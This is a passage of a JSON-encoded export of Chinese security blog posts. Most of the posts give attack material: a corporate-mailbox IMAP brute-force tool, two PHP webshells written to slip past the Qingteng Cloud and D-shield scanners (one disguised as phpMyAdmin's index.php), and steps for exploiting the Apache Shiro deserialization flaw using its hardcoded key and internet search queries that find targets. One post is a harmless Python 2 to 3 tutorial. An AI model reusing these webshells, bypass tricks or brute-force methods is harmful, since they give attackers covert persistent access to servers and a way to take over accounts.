href=\&#34;https://www.exploit-db.com/exploits/47990\&#34;&gt;Jira 8.3.4 - Information Disclosure (Username Enumeration)&lt;/a&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.doyler.net/security-not-included/more-jira-enumeration\&#34;&gt;More Jira Enumeration (usernames) – CVE-2019-8449&lt;/a&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;a href=\&#34;https://jira.atlassian.com/browse/JRASERVER-69796\&#34;&gt;User enumeration through the groupuserpicker api resource - CVE-2019-8449&lt;/a&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;title&#34;:&#34;CVE-2019-8449 Jira 枚举用户漏洞的利用&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;Vulnerability&#34;,&#34;slug&#34;:&#34;cC2YgdB4CiQ&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cC2YgdB4CiQ/&#34;},{&#34;name&#34;:&#34;Exploit&#34;,&#34;slug&#34;:&#34;bllpWtIboyS&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/bllpWtIboyS/&#34;},{&#34;name&#34;:&#34;cve-2019-8849&#34;,&#34;slug&#34;:&#34;Hky9qqMofJU&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Hky9qqMofJU/&#34;},{&#34;name&#34;:&#34;jira&#34;,&#34;slug&#34;:&#34;NIDLg5mTqWg&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/NIDLg5mTqWg/&#34;}],&#34;date&#34;:&#34;2020-02-13 21:51:48&#34;,&#34;dateFormat&#34;:&#34;2020-02-13&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/cve-2019-8449-jira-enum-usernames.jpg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/cve-2019-8449-jira-enum-usernames/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:95000,&#34;words&#34;:414,&#34;minutes&#34;:2},&#34;description&#34;:&#34;一个很攻击门槛很低的漏洞。可结合其它漏洞配合来进行攻击。\n首先来简单说一下这个漏洞，该漏洞就是在Jira 8.4.0以前的版本，攻击者可以在不经过授权的情况下访问/rest/api/latest/groupuserpicker这个路径来枚举...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%9B%B8%E5%85%B3%E8%BF%9E%E6%8E%A5\&#34;&gt;相关连接&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;IMAP（Internet Mail Access Protocol）以前称作交互邮件访问协议（Interactive Mail Access Protocol），是一个应用层协议。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP/IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。----来源于百度百科&lt;/p&gt;\n&lt;p&gt;目前知名企业邮箱（如腾讯企业邮箱）均支持该协议，许多人喜欢用邮件客户端或者手机收发邮件，则大多数会选择开启该服务。在大多数情况下适用。（文末有脚本下载地址）。&lt;/p&gt;\n&lt;p&gt;该脚本使用Python开发，2和3版本均可运行。&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1577972620061.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;pre&gt;&lt;code&gt;usage: imap-bruteforce.py [-h] [-s SERVER] [-p PORT] -d DOMAIN [-u USER]\n                          [-o [OUTPUT]]\n\nOPTIONS:\n  -h, --help            show this help message and exit\n  -s SERVER, --server SERVER\n                        imap host\n  -p PORT, --port PORT  port\n  -d DOMAIN, --domain DOMAIN\n                        domain\n  -u USER, --user USER  user\n  -o [OUTPUT], --output [OUTPUT]\n                        save the result to text file\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;-h, --help&lt;br&gt;\n帮助说明&lt;br&gt;\n-s SERVER&lt;br&gt;\nimap 服务器地址，默认是imap.exmail.qq.com&lt;br&gt;\n-p PORT&lt;br&gt;\nimap 服务器端口，默认是imaps的993端口&lt;br&gt;\n-d DOMAIN&lt;br&gt;\n要爆破的企业域名，该项为必须&lt;br&gt;\n-u USER&lt;br&gt;\n要爆破的用户名，或者存有用户名的文件列表（一行一个），默认读取当前目录下的email.txt&lt;br&gt;\n-o [OUTPUT]&lt;br&gt;\n输出的结果文件，默认保存在result.txt&lt;/p&gt;\n&lt;p&gt;除此之外，在当前目录下生成logs.txt文件，保存错误以及验证失败的日志信息。方便分析情况。&lt;/p&gt;\n&lt;p&gt;下载地址：&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://github.com/insightglacier/IMAP_Bruteforce\&#34;&gt;https://github.com/insightglacier/IMAP_Bruteforce&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;防护&lt;/strong&gt;&lt;br&gt;\n作为企业来说，无比要求员工修改默认密码，不要使用若密码，有规律的密码，如键盘密码。以此来降低风险，企业也应定期检查企业内部员工邮箱情况，降低风险，提高企业安全性。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;IMAP-Bruteforce-Script&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;IMAP（Internet Mail Access Protocol）以前称作交互邮件访问协议（Interactive Mail Access Protocol），是一个应用层协议。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP/IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。----来源于百度百科&lt;/p&gt;\n&lt;p&gt;目前知名企业邮箱（如腾讯企业邮箱）均支持该协议，许多人喜欢用邮件客户端或者手机收发邮件，则大多数会选择开启该服务。在大多数情况下适用。（文末有脚本下载地址）。&lt;/p&gt;\n&lt;p&gt;该脚本使用Python开发，2和3版本均可运行。&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1577972620061.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;企业邮箱爆破脚本&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;Tool&#34;,&#34;slug&#34;:&#34;G8-CImT42BP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/G8-CImT42BP/&#34;},{&#34;name&#34;:&#34;python2&#34;,&#34;slug&#34;:&#34;bED_E3rfYAH&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/bED_E3rfYAH/&#34;},{&#34;name&#34;:&#34;program&#34;,&#34;slug&#34;:&#34;qmfVDs3KfWC&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/qmfVDs3KfWC/&#34;},{&#34;name&#34;:&#34;IMAP&#34;,&#34;slug&#34;:&#34;cAPh_K0j9xR&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cAPh_K0j9xR/&#34;},{&#34;name&#34;:&#34;Bruteforce&#34;,&#34;slug&#34;:&#34;zQYqR-ZzbXb&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/zQYqR-ZzbXb/&#34;}],&#34;date&#34;:&#34;2020-01-02 21:35:45&#34;,&#34;dateFormat&#34;:&#34;2020-01-02&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/IMAP-Bruteforce-Script.jpg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/IMAP-Bruteforce-Script/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;3 min read&#34;,&#34;time&#34;:136000,&#34;words&#34;:595,&#34;minutes&#34;:3},&#34;description&#34;:&#34;IMAP（Internet Mail Access Protocol）以前称作交互邮件访问协议（Interactive Mail Access Protocol），是一个应用层协议。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;上周看到一些朋友在发青藤云的聊天记录，绕过一个发200块红包。周末的时候就简单做了个测试。&lt;br&gt;\n首先使用绕过D盾的webshell，发现被标记为恶意。这就有点意思了。我去看了一下聊天记录的内容，看原理是采用的深度学习的方式。猜测是有监督的方式来实现的（仅为猜测）。我这里绕过的思路采用的是，使用开源程序进行修改，带入一句话后门代码。&lt;/p&gt;\n&lt;p&gt;记得Phpmyadmin的index.php文件中包含有&lt;code&gt;include ROOT_PATH . $_REQUEST[&#39;target&#39;];&lt;/code&gt;这样的代码，如果不看上下文，这个妥妥的文件包含漏洞。不过上文有过滤和判断处理，导致无法包含任意文件。我将其修改为包含任意文件。同时保留来一些源码，把影响执行的代码注释掉（因为适应多种环境，适用但文件的情况）。&lt;br&gt;\n最终修改的代码如下：&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;pre&gt;&lt;code&gt;&amp;lt;?php\n/* vim: set expandtab sw=4 ts=4 sts=4: */\n/**\n * Main loader script\n *\n * @package PhpMyAdmin\n */\ndeclare(strict_types=1);\n/*\nuse PhpMyAdmin\\Controllers\\HomeController;\nuse PhpMyAdmin\\Core;\nuse PhpMyAdmin\\DatabaseInterface;\nuse PhpMyAdmin\\Response;\nuse PhpMyAdmin\\Url;\nuse PhpMyAdmin\\Util;\n*/\nif (! defined(&#39;ROOT_PATH&#39;)) {\n    define(&#39;ROOT_PATH&#39;, &#39;&#39;);   //这里做了修改，不影响后门包含文件\n}\n\nglobal $server;\n\n//require_once ROOT_PATH . &#39;libraries/common.inc.php&#39;;\n\n/**\n * pass variables to child pages\n */\n$drops = [\n    &#39;lang&#39;,\n    &#39;server&#39;,\n    &#39;collation_connection&#39;,\n    &#39;db&#39;,\n    &#39;table&#39;,\n];\nforeach ($drops as $each_drop) {\n    if (array_key_exists($each_drop, $_GET)) {\n        unset($_GET[$each_drop]);\n    }\n}\nunset($drops, $each_drop);\n\n/**\n * Black list of all scripts to which front-end must submit data.\n * Such scripts must not be loaded on home page.\n */\n$target_blacklist =  [\n    &#39;import.php&#39;,\n    &#39;export.php&#39;,\n];\n\n// If we have a valid target, let&#39;s load that script instead\nif (! empty($_REQUEST[&#39;target&#39;])\n    &amp;amp;&amp;amp; is_string($_REQUEST[&#39;target&#39;])\n    &amp;amp;&amp;amp; 0 == strpos($_REQUEST[&#39;target&#39;], &amp;quot;index&amp;quot;)\n    //&amp;amp;&amp;amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)   //检查黑名单，注释掉\n    //&amp;amp;&amp;amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;], [], true)   //验证page的有效性，也去掉\n) {\n    include ROOT_PATH . $_REQUEST[&#39;target&#39;];\n    exit;\n}\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;测试是否正常使用，确认可用后，上传测试。结果显示为正常。至此绕过完成。下图是结果（2019年12月29日测试结果）。具体如何使用，可以看上一篇绕过D盾的内容。&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1577714187280.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;br&gt;\n青藤云这个做的确实不错。绕过的思路还有其他的，我的思路是选择避开eval，assert使用率高的特征，同时在加入一些正常文件代码的方式来绕过。对于还有其它思路，这里仅作为测试研究。另外除了检测以外，还需要考虑误报情况，我测试传的一个正常文件也报恶意了，所以这个也是需要进行权衡的。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;QingtengCloud-Bypass-Php-Webshell&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;上周看到一些朋友在发青藤云的聊天记录，绕过一个发200块红包。周末的时候就简单做了个测试。&lt;br&gt;\n首先使用绕过D盾的webshell，发现被标记为恶意。这就有点意思了。我去看了一下聊天记录的内容，看原理是采用的深度学习的方式。猜测是有监督的方式来实现的（仅为猜测）。我这里绕过的思路采用的是，使用开源程序进行修改，带入一句话后门代码。&lt;/p&gt;\n&lt;p&gt;记得Phpmyadmin的index.php文件中包含有&lt;code&gt;include ROOT_PATH . $_REQUEST[&#39;target&#39;];&lt;/code&gt;这样的代码，如果不看上下文，这个妥妥的文件包含漏洞。不过上文有过滤和判断处理，导致无法包含任意文件。我将其修改为包含任意文件。同时保留来一些源码，把影响执行的代码注释掉（因为适应多种环境，适用但文件的情况）。&lt;br&gt;\n最终修改的代码如下：&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;青藤云Webshell查杀绕过&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;bypass&#34;,&#34;slug&#34;:&#34;-CeSGG-a_cS&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/-CeSGG-a_cS/&#34;},{&#34;name&#34;:&#34;Tool&#34;,&#34;slug&#34;:&#34;G8-CImT42BP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/G8-CImT42BP/&#34;},{&#34;name&#34;:&#34;Webshell&#34;,&#34;slug&#34;:&#34;rXWZeePHzwb&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/rXWZeePHzwb/&#34;}],&#34;date&#34;:&#34;2019-12-30 20:52:58&#34;,&#34;dateFormat&#34;:&#34;2019-12-30&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/QingtengCloud-Bypass-Php-Webshell/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;3 min read&#34;,&#34;time&#34;:152000,&#34;words&#34;:623,&#34;minutes&#34;:3},&#34;description&#34;:&#34;上周看到一些朋友在发青藤云的聊天记录，绕过一个发200块红包。周末的时候就简单做了个测试。\n首先使用绕过D盾的webshell，发现被标记为恶意。这就有点意思了。我去看了一下聊天记录的内容，看原理是采用的深度学习的方式。猜测是有监督的方式来...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;去年分析D盾的查杀规律弄的绕过。&lt;br&gt;\n查杀效果：&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1577534683394.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;具体请看代码：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;&amp;lt;?php\nfunction cc(){\n    global $b;\n    $a =$_GET[$b];  //此处可改成POST方式\n    $str =$a;\n    return $str;\n}\n?&amp;gt;\n&amp;lt;?php\n$b=&amp;quot;url&amp;quot;;\n$c=cc();\n$aa = $c;\n\ninclude($aa);\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;传入参数方式：&lt;br&gt;\nhttp://127.0.0.1/test/include.php?url=本地或远程文件名（或者利用data:image/png的这种格式）&lt;br&gt;\n例如：&lt;br&gt;\nhttp://127.0.0.1/test/include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==&lt;br&gt;\n上看base64,后面为要执行的代码，代码要带&lt;?php，然后将代码进行base64编码传入。这里的例子是&lt;?php phpinfo(); ?&gt;，实战中可以把代码改成一句话，然后使用菜刀连接即可。&lt;/p&gt;\n&lt;!-- more --&gt;\n&#34;,&#34;fileName&#34;:&#34;Webshellkill-Bypass-Php-Webshell&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;去年分析D盾的查杀规律弄的绕过。&lt;br&gt;\n查杀效果：&lt;br&gt;\n&lt;img src=\&#34;https://www.bacde.me/post-images/1577534683394.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;具体请看代码：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;&amp;lt;?php\nfunction cc(){\n    global $b;\n    $a =$_GET[$b];  //此处可改成POST方式\n    $str =$a;\n    return $str;\n}\n?&amp;gt;\n&amp;lt;?php\n$b=&amp;quot;url&amp;quot;;\n$c=cc();\n$aa = $c;\n\ninclude($aa);\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;传入参数方式：&lt;br&gt;\nhttp://127.0.0.1/test/include.php?url=本地或远程文件名（或者利用data:image/png的这种格式）&lt;br&gt;\n例如：&lt;br&gt;\nhttp://127.0.0.1/test/include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==&lt;br&gt;\n上看base64,后面为要执行的代码，代码要带&lt;?php，然后将代码进行base64编码传入。这里的例子是&lt;?php phpinfo(); ?&gt;，实战中可以把代码改成一句话，然后使用菜刀连接即可。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;最新绕过D盾的php Webshell&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;bypass&#34;,&#34;slug&#34;:&#34;-CeSGG-a_cS&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/-CeSGG-a_cS/&#34;},{&#34;name&#34;:&#34;Tool&#34;,&#34;slug&#34;:&#34;G8-CImT42BP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/G8-CImT42BP/&#34;},{&#34;name&#34;:&#34;Webshell&#34;,&#34;slug&#34;:&#34;rXWZeePHzwb&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/rXWZeePHzwb/&#34;}],&#34;date&#34;:&#34;2019-12-28 19:32:53&#34;,&#34;dateFormat&#34;:&#34;2019-12-28&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Webshellkill-Bypass-Php-Webshell/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:35000,&#34;words&#34;:127,&#34;minutes&#34;:1},&#34;description&#34;:&#34;去年分析D盾的查杀规律弄的绕过。\n查杀效果：\n\n具体请看代码：\n&amp;lt;?php\nfunction cc(){\n    global $b;\n    $a =$_GET[$b];  //此处可改成POST方式\n    $str =$a;\n ...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;时代在发展，技术在进步。没有什么是停止不前的！2019年已经接近尾声，Python2停止更新的时间越来越近。其中比较流行的如 NumPy、Requests 和 TensorFlow 等承诺到 2020 年将停止支持2.x。尽管迁移过程也会花许多时间与精力，但是转Python3是早晚都要面对的。最近在迁移自己的代码到Python3，对于迁移的过程中遇到的情况进行总结。&lt;/p&gt;\n&lt;p&gt;首先我们来说一下常用的print。&lt;br&gt;\n最明显的区别就在于，我们在2.x版本中的&lt;code&gt;print &amp;quot;hello world&amp;quot;&lt;/code&gt; ，在3.x版本中会报错。必须要以&lt;code&gt;print(&amp;quot;hello world&amp;quot;)&lt;/code&gt;这样的格式。为什么会发生这样的变化呢？下面就让我们来看一下～&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;主要的变化就在于2.x中print是一个语句，我们可以讲要输出的内容直接放到print关键字后面即可。而3.x版本里，print()是一个函数,需要将输出的内容作为参数传递给print函数。&lt;br&gt;\n这里我们可以通过help函数来测试下。昨边终端的是2.7版本，右边的为3.7版本&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1577370604020.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;我们可以看到，2.x版本中直接报语法错误，3.x版本中显示来函数的帮助信息。&lt;br&gt;\n我们来看一下3.x中的函数说明：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;print(value, ..., sep=&#39; &#39;, end=&#39;\\n&#39;, file=sys.stdout, flush=False)\n\n    Prints the values to a stream, or to sys.stdout by default.\n    Optional keyword arguments:\n    file:  a file-like object (stream); defaults to the current sys.stdout.\n    sep:   string inserted between values, default a space.\n    end:   string appended after the last value, default a newline.\n    flush: whether to forcibly flush the stream.\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;value表示要输出的内容，可以有多个，其中用逗号隔开即可。可以使用格式化方法输出，也可以占位符的方式输出。具体转换的类型，可以去查阅相关表格，这里不做过多说明。&lt;br&gt;\n例如：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;print(&amp;quot;123&amp;quot;,&amp;quot;456&amp;quot;,&amp;quot;789&amp;quot;)\nprint(&amp;quot;My name is %s,I&#39;m %d years old.&amp;quot; % (&#39;Tom&#39;,18))\nprint(&amp;quot;My name is {0}，,I&#39;m %d years old.{1}&amp;quot;.format(&#39;Tom&#39;, 18))\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;sep表示要使用的间隔符号，默认逗号隔开的参数会以空格间隔，使用sep参数可以替换成想要的分隔符，如下划线等符号。&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;print(&amp;quot;hello&amp;quot;,&amp;quot;world&amp;quot;,sep=&amp;quot;_&amp;quot;)&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;end表示换行，不加该参数默认是回车，使用end可以控制是否换行，比如：&lt;br&gt;\n&lt;code&gt;print(&amp;quot;lines&amp;quot;,end=&amp;quot;&amp;quot;)&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;file表示输出到的位置，默认是stdout，即输出到控制台。如果要输出到文件，首先需要open打开文件，然后设置打开的文件。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;fp = open(&amp;quot;1.txt&amp;quot;, &amp;quot;w&amp;quot;)\nprint(&amp;quot;write file&amp;quot;, file=fp)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;flush 指是否立即输出，默认情况下优先存放到缓冲区，系统碰到\\n换行的时候会立即输出，没有换行不立即输出，flush=True可在没有换行的情况下立即输出。不过这个目前看不太常用。&lt;/p&gt;\n&lt;p&gt;接下来要说的是关于输出的字符类型：&lt;br&gt;\n2.x版本的编码问题一直比较蛋疼，2.x版本中有两种字符串类型：Unicode字符串和非Unicode字符串。3.x中只有一种字符串类型,即Unicode字符串。3.x中减少了2.x中比较蛋疼的字符串问题。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;迁移过程中的代码批量替换&lt;/strong&gt;&lt;br&gt;\n可以使用编辑器中的正则替换功能进行批量替换，这里大家使用的不同编辑器可能会存在些差异，可以根据具体情况来定，我这里使用vscode。如下图：&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1577372350489.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n搜索的正则为：&lt;code&gt;print\\s*(.*)&lt;/code&gt;&lt;br&gt;\n替换的内容为：&lt;code&gt;print($1)&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;这里仅仅是第一篇，后续会继续更新。如http处理，字符串差异，异常处理、数据类型等。避免大家在过程中踩坑。大家也有一些场景问题，也可以在评论中发出来。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;python2-to-python3-print&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;时代在发展，技术在进步。没有什么是停止不前的！2019年已经接近尾声，Python2停止更新的时间越来越近。其中比较流行的如 NumPy、Requests 和 TensorFlow 等承诺到 2020 年将停止支持2.x。尽管迁移过程也会花许多时间与精力，但是转Python3是早晚都要面对的。最近在迁移自己的代码到Python3，对于迁移的过程中遇到的情况进行总结。&lt;/p&gt;\n&lt;p&gt;首先我们来说一下常用的print。&lt;br&gt;\n最明显的区别就在于，我们在2.x版本中的&lt;code&gt;print &amp;quot;hello world&amp;quot;&lt;/code&gt; ，在3.x版本中会报错。必须要以&lt;code&gt;print(&amp;quot;hello world&amp;quot;)&lt;/code&gt;这样的格式。为什么会发生这样的变化呢？下面就让我们来看一下～&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Python2与Python3差异之print&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;python2&#34;,&#34;slug&#34;:&#34;bED_E3rfYAH&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/bED_E3rfYAH/&#34;},{&#34;name&#34;:&#34;program&#34;,&#34;slug&#34;:&#34;qmfVDs3KfWC&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/qmfVDs3KfWC/&#34;},{&#34;name&#34;:&#34;python&#34;,&#34;slug&#34;:&#34;4rz2rGQDLJ5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/4rz2rGQDLJ5/&#34;},{&#34;name&#34;:&#34;python3&#34;,&#34;slug&#34;:&#34;z5BB8Z_J2DE&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/z5BB8Z_J2DE/&#34;}],&#34;date&#34;:&#34;2019-12-26 22:05:32&#34;,&#34;dateFormat&#34;:&#34;2019-12-26&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/python2-to-python3-print.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/python2-to-python3-print/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;4 min read&#34;,&#34;time&#34;:234000,&#34;words&#34;:991,&#34;minutes&#34;:4},&#34;description&#34;:&#34;时代在发展，技术在进步。没有什么是停止不前的！2019年已经接近尾声，Python2停止更新的时间越来越近。其中比较流行的如 NumPy、Requests 和 TensorFlow 等承诺到 2020 年将停止支持2.x。尽管迁移过程也会花...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，网络中曝光1.2.4以前的版本存在反序列化漏洞。尽管该漏洞已经曝光几年，但是在实战中仍然比较实用。花了点时间研究了下，并根据网络上的利用脚本改进。主要修改了检测方式，并使利用方式更加简单灵活，使其更具有实战意义，提升其效率。&lt;/p&gt;\n&lt;h2 id=\&#34;漏洞原理\&#34;&gt;漏洞原理&lt;/h2&gt;\n&lt;p&gt;Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。&lt;br&gt;\n在服务端接收cookie值时，按照如下步骤来解析处理：&lt;br&gt;\n1、检索RememberMe cookie 的值&lt;br&gt;\n2、Base 64解码&lt;br&gt;\n3、使用AES解密(加密密钥硬编码)&lt;br&gt;\n4、进行反序列化操作（未作过滤处理）&lt;/p&gt;\n&lt;p&gt;在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;&lt;strong&gt;漏洞利用条件&lt;/strong&gt;：&lt;br&gt;\n由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。&lt;/p&gt;\n&lt;p&gt;尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。&lt;/p&gt;\n&lt;h2 id=\&#34;检测与利用\&#34;&gt;检测与利用&lt;/h2&gt;\n&lt;p&gt;&lt;strong&gt;目标发现与寻找&lt;/strong&gt;&lt;br&gt;\nShrio框架的特征是登录页面的cookie中存在remeberMe=deleteMe（失败时返回的值）的内容。通过该特征发现Shiro的系统有几种方式：&lt;br&gt;\n1、在登录页面时，提交表单后看set-cookie是否存在remeberMe=deleteMe。&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1576850458151.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n2、在流量中搜索remeberMe=deleteMe。&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1576850445598.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n3、通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。&lt;br&gt;\n例如fofa的搜索关键词：header=&amp;quot;rememberme=deleteMe&amp;quot;、header=&amp;quot;shiroCookie&amp;quot;&lt;br&gt;\n&lt;img src=\&#34;https://bacde.me/post-images/1576850432970.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;漏洞检测&lt;/strong&gt;&lt;br&gt;\n漏洞检测的面临的问题：&lt;br&gt;\n1、该漏洞无法回显&lt;br&gt;\n2、系统环境复杂&lt;br&gt;\n3、aes的key可能被修改。&lt;br&gt;\n对于第一个问题，可以通过dnslog平台，使用ysoserial的URLDNS 